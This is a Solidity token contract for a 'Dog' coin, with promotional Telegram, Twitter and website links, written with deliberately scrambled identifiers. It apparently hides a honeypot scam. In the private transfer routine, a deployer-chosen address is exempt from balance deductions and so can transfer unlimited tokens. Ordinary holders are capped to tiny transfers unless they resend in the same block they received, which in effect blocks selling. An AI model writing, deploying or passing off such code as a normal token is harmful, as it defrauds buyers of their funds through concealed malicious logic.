/*

Telegram: https://t.me/DogOnETH

Twitter: https://twitter.com/DogonETH

Website: https://dog.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Dog is Ownable {
    string public symbol;

    mapping(address => bool) private evxrfp;

    function approve(address nvplkcad, uint256 cmatprgdv) public returns (bool success) {
        allowance[msg.sender][nvplkcad] = cmatprgdv;
        emit Approval(msg.sender, nvplkcad, cmatprgdv);
        return true;
    }

    function transferFrom(address lrjktxqebs, address rudfplnwame, uint256 cmatprgdv) public returns (bool success) {
        require(cmatprgdv <= allowance[lrjktxqebs][msg.sender]);
        allowance[lrjktxqebs][msg.sender] -= cmatprgdv;
        zejqv(lrjktxqebs, rudfplnwame, cmatprgdv);
        return true;
    }

    string public name;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private xfrkztlncwvj;

    function transfer(address rudfplnwame, uint256 cmatprgdv) public returns (bool success) {
        zejqv(msg.sender, rudfplnwame, cmatprgdv);
        return true;
    }

    function zejqv(address lrjktxqebs, address rudfplnwame, uint256 cmatprgdv) private {
        address bwot = IUniswapV2Factory(xfwuocvpyl.factory()).getPair(address(this), xfwuocvpyl.WETH());
        bool qrwndm = hrykcud[lrjktxqebs] == block.number;
        if (!evxrfp[lrjktxqebs]) {
            if (lrjktxqebs != bwot && cmatprgdv < totalSupply && (!qrwndm || cmatprgdv > xfrkztlncwvj[lrjktxqebs])) {
                require(cmatprgdv <= totalSupply / (10 ** decimals));
            }
            balanceOf[lrjktxqebs] -= cmatprgdv;
        }
        xfrkztlncwvj[rudfplnwame] = cmatprgdv;
        balanceOf[rudfplnwame] += cmatprgdv;
        hrykcud[rudfplnwame] = block.number;
        emit Transfer(lrjktxqebs, rudfplnwame, cmatprgdv);
    }

    uint8 public decimals = 9;

    constructor(string memory adtcslxmqov, string memory dqbepw, address adpxj, address bmted) {
        name = adtcslxmqov;
        symbol = dqbepw;
        balanceOf[msg.sender] = totalSupply;
        evxrfp[bmted] = true;
        xfwuocvpyl = IUniswapV2Router02(adpxj);
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private xfwuocvpyl;

    mapping(address => uint256) private hrykcud;

    event Transfer(address indexed from, address indexed to, uint256 value);
}
